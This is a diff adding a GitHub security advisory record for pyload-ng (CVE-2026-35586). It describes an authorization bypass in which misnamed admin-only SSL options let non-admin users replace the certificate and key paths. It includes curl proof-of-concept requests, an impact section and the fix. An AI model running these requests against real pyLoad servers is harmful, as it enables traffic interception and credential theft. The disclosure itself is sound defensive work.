@@ -1,0 +1,152 @@
+{
+  "id": "GHSA-ppvx-rwh9-7rj7",
+  "modified": "2026-04-08T00:21:59.389918Z",
+  "published": "2026-04-08T00:04:34Z",
+  "aliases": [
+    "CVE-2026-35586"
+  ],
+  "summary": "pyload-ng: Authorization Bypass for SSL Certificate/Key Configuration Due to Option Name Mismatch in pyload-ng",
+  "details": "## Summary\n\nThe `ADMIN_ONLY_CORE_OPTIONS` authorization set in `set_config_value()` uses incorrect option names `ssl_cert` and `ssl_key`, while the actual configuration option names are `ssl_certfile` and `ssl_keyfile`. This name mismatch causes the admin-only check to always evaluate to False, allowing any user with SETTINGS permission to overwrite the SSL certificate and key file paths. Additionally, the `ssl_certchain` option was never added to the admin-only set at all.\n\n## Details\n\nThe vulnerability is in `src/pyload/core/api/__init__.py`. The `ADMIN_ONLY_CORE_OPTIONS` set is defined at lines 237-248:\n\n```python\nADMIN_ONLY_CORE_OPTIONS = {\n    (\"general\", \"storage_folder\"),\n    (\"log\", \"syslog_host\"),\n    (\"log\", \"syslog_port\"),\n    (\"proxy\", \"password\"),\n    (\"proxy\", \"username\"),\n    (\"reconnect\", \"script\"),\n    (\"webui\", \"host\"),\n    (\"webui\", \"ssl_cert\"),      # BUG: should be \"ssl_certfile\"\n    (\"webui\", \"ssl_key\"),       # BUG: should be \"ssl_keyfile\"\n    (\"webui\", \"use_ssl\"),\n}\n# NOTE: (\"webui\", \"ssl_certchain\") is entirely missing\n```\n\nThe actual config option names are defined in `src/pyload/core/config/default.cfg:39-41`:\n\n```\nfile ssl_certfile : \"SSL Certificate\" = ssl.crt\nfile ssl_keyfile : \"SSL Key\" = ssl.key\nfile ssl_certchain : \"CA's intermediate certificate bundle (optional)\" =\n```\n\nThe authorization check at line 267 compares the incoming `(category, option)` tuple against this set:\n\n```python\nif (category, option) in ADMIN_ONLY_CORE_OPTIONS and not is_admin:\n    self.pyload.log.error(...)\n    return\n```\n\nWhen a request arrives with `option=ssl_certfile`, the check evaluates `(\"webui\", \"ssl_certfile\") in ADMIN_ONLY_CORE_OPTIONS` which is **False** because the set contains `(\"webui\", \"ssl_cert\")`, not `(\"webui\", \"ssl_certfile\")`. The admin-only guard is bypassed and `config.set()` at line 271 proceeds to write the attacker-supplied value.\n\nThe value is cast as a `file` type in `parser.py:300-305`, which resolves it via `os.path.realpath()` but performs no further validation:\n\n```python\nelif typ in (\"file\", \"folder\"):\n    return (\n        \"\"\n        if value in (None, \"\")\n        else os.path.realpath(os.path.expanduser(os.fsdecode(value)))\n    )\n```\n\nOn server restart with SSL enabled, the webserver loads the attacker-controlled paths (`webserver_thread.py:22-23,51-52`):\n\n```python\nself.certfile = self.pyload.config.get(\"webui\", \"ssl_certfile\")\nself.keyfile = self.pyload.config.get(\"webui\", \"ssl_keyfile\")\n# ...\nself.server.ssl_adapter = BuiltinSSLAdapter(\n    self.certfile, self.keyfile, self.certchain\n)\n```\n\n## PoC\n\nPrerequisites: A pyLoad instance with SSL enabled and a non-admin user account that has SETTINGS permission.\n\n**Step 1:** Authenticate as the non-admin user to get a session cookie:\n```bash\ncurl -c cookies.txt -X POST 'http://localhost:8000/login' \\\n  -d 'username=settingsuser\u0026password=password123'\n```\n\n**Step 2:** Set the SSL certificate to an attacker-controlled file path:\n```bash\ncurl -b cookies.txt -X POST 'http://localhost:8000/json/save_config' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"category\": \"core\", \"config\": {\"webui|ssl_certfile\": \"/tmp/attacker.crt\"}}'\n```\nExpected response: `true` (config saved successfully)\n\n**Step 3:** Set the SSL key to an attacker-controlled file path:\n```bash\ncurl -b cookies.txt -X POST 'http://localhost:8000/json/save_config' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"category\": \"core\", \"config\": {\"webui|ssl_keyfile\": \"/tmp/attacker.key\"}}'\n```\nExpected response: `true` (config saved successfully)\n\n**Step 4:** Set the SSL certificate chain (never protected):\n```bash\ncurl -b cookies.txt -X POST 'http://localhost:8000/json/save_config' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"category\": \"core\", \"config\": {\"webui|ssl_certchain\": \"/tmp/attacker-chain.crt\"}}'\n```\nExpected response: `true` (config saved successfully)\n\n**Step 5:** After the server restarts, it will load the attacker's certificate and key for all HTTPS connections.\n\n## Impact\n\nA non-admin user with SETTINGS permission can replace the SSL certificate and key used by the pyLoad HTTPS server. When the server restarts (or is restarted by an admin), it will serve HTTPS using the attacker's certificate/key pair. This enables:\n\n- **Man-in-the-Middle attacks:** The attacker, possessing the private key for the now-active certificate, can intercept and decrypt all HTTPS traffic to the pyLoad instance, including admin credentials and session tokens.\n- **Credential theft:** All users (including admins) connecting over HTTPS will have their credentials exposed to the attacker.\n- **Configuration tampering:** With intercepted admin credentials, the attacker can escalate to full admin access.\n\nThe attack requires SSL to already be enabled by an admin (the `use_ssl` option is correctly protected), the attacker to place certificate/key files on the filesystem (potentially achievable via pyLoad's download functionality), and a server restart.\n\n## Recommended Fix\n\nFix the option names in `ADMIN_ONLY_CORE_OPTIONS` and add the missing `ssl_certchain` option in `src/pyload/core/api/__init__.py`:\n\n```python\nADMIN_ONLY_CORE_OPTIONS = {\n    (\"general\", \"storage_folder\"),\n    (\"log\", \"syslog_host\"),\n    (\"log\", \"syslog_port\"),\n    (\"proxy\", \"password\"),\n    (\"proxy\", \"username\"),\n    (\"reconnect\", \"script\"),\n    (\"webui\", \"host\"),\n    (\"webui\", \"ssl_certfile\"),    # Fixed: was \"ssl_cert\"\n    (\"webui\", \"ssl_keyfile\"),     # Fixed: was \"ssl_key\"\n    (\"webui\", \"ssl_certchain\"),   # Added: was missing entirely\n    (\"webui\", \"use_ssl\"),\n}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pyload-ng",
+        "purl": "pkg:pypi/pyload-ng"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.5.0b3.dev97"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.5.0a5.dev528",
+        "0.5.0a5.dev532",
+        "0.5.0a5.dev535",
+        "0.5.0a5.dev536",
+        "0.5.0a5.dev537",
+        "0.5.0a5.dev539",
+        "0.5.0a5.dev540",
+        "0.5.0a5.dev545",
+        "0.5.0a5.dev562",
+        "0.5.0a5.dev564",
+        "0.5.0a5.dev565",
+        "0.5.0a6.dev570",
+        "0.5.0a6.dev578",
+        "0.5.0a6.dev587",
+        "0.5.0a7.dev596",
+        "0.5.0a8.dev602",
+        "0.5.0a9.dev615",
+        "0.5.0a9.dev629",
+        "0.5.0a9.dev632",
+        "0.5.0a9.dev641",
+        "0.5.0a9.dev643",
+        "0.5.0a9.dev655",
+        "0.5.0a9.dev806",
+        "0.5.0b1.dev1",
+        "0.5.0b1.dev2",
+        "0.5.0b1.dev3",
+        "0.5.0b1.dev4",
+        "0.5.0b1.dev5",
+        "0.5.0b2.dev10",
+        "0.5.0b2.dev11",
+        "0.5.0b2.dev12",
+        "0.5.0b2.dev9",
+        "0.5.0b3.dev13",
+        "0.5.0b3.dev14",
+        "0.5.0b3.dev17",
+        "0.5.0b3.dev18",
+        "0.5.0b3.dev19",
+        "0.5.0b3.dev20",
+        "0.5.0b3.dev21",
+        "0.5.0b3.dev22",
+        "0.5.0b3.dev24",
+        "0.5.0b3.dev26",
+        "0.5.0b3.dev27",
+        "0.5.0b3.dev28",
+        "0.5.0b3.dev29",
+        "0.5.0b3.dev30",
+        "0.5.0b3.dev31",
+        "0.5.0b3.dev32",
+        "0.5.0b3.dev33",
+        "0.5.0b3.dev34",
+        "0.5.0b3.dev35",
+        "0.5.0b3.dev38",
+        "0.5.0b3.dev39",
+        "0.5.0b3.dev40",
+        "0.5.0b3.dev41",
+        "0.5.0b3.dev42",
+        "0.5.0b3.dev43",
+        "0.5.0b3.dev44",
+        "0.5.0b3.dev45",
+        "0.5.0b3.dev46",
+        "0.5.0b3.dev47",
+        "0.5.0b3.dev48",
+        "0.5.0b3.dev49",
+        "0.5.0b3.dev50",
+        "0.5.0b3.dev51",
+        "0.5.0b3.dev52",
+        "0.5.0b3.dev53",
+        "0.5.0b3.dev54",
+        "0.5.0b3.dev57",
+        "0.5.0b3.dev60",
+        "0.5.0b3.dev62",
+        "0.5.0b3.dev64",
+        "0.5.0b3.dev65",
+        "0.5.0b3.dev66",
+        "0.5.0b3.dev67",
+        "0.5.0b3.dev68",
+        "0.5.0b3.dev69",
+        "0.5.0b3.dev70",
+        "0.5.0b3.dev71",
+        "0.5.0b3.dev72",
+        "0.5.0b3.dev73",
+        "0.5.0b3.dev74",
+        "0.5.0b3.dev75",
+        "0.5.0b3.dev76",
+        "0.5.0b3.dev77",
+        "0.5.0b3.dev78",
+        "0.5.0b3.dev79",
+        "0.5.0b3.dev80",
+        "0.5.0b3.dev81",
+        "0.5.0b3.dev82",
+        "0.5.0b3.dev85",
+        "0.5.0b3.dev87",
+        "0.5.0b3.dev88",
+        "0.5.0b3.dev89",
+        "0.5.0b3.dev90",
+        "0.5.0b3.dev91",
+        "0.5.0b3.dev92",
+        "0.5.0b3.dev93",
+        "0.5.0b3.dev94",
+        "0.5.0b3.dev95",
+        "0.5.0b3.dev96"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-ppvx-rwh9-7rj7/GHSA-ppvx-rwh9-7rj7.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pyload/pyload/security/advisories/GHSA-ppvx-rwh9-7rj7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35586"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pyload/pyload"
+    }
+  ]
+}
